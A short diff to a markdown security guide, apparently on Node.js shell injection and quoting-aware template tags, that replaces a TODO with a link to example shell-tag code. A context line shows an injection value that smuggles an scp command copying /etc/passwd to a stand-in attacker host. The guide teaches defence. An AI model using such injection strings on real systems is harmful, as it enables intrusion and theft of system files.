@@ -50,7 +50,7 @@ causes execution of the following script
 executable ' '; scp /etc/passwd evil@evil.org/; echo ' '
 ```
 
-The accompanying example code (TODO link) includes a tag
+The [accompanying example code][sh-code] includes a tag
 implementation for `sh` and `bash` that recognizes nesting
 contexts including double and single quoted strings, *heredoc*
 streams, and sub-shells like `$(...)` and <code>&#96;...&#96;</code>.
@@ -60,3 +60,4 @@ streams, and sub-shells like `$(...)` and <code>&#96;...&#96;</code>.
 [cp.spawn]: https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options
 [SHP]: ../chapter-1/threat-SHP.md
 [BOF]: ../chapter-1/threat-BOF.md
+[sh-code]: https://github.com/google/node-sec-roadmap/tree/master/chapter-7/examples/sh
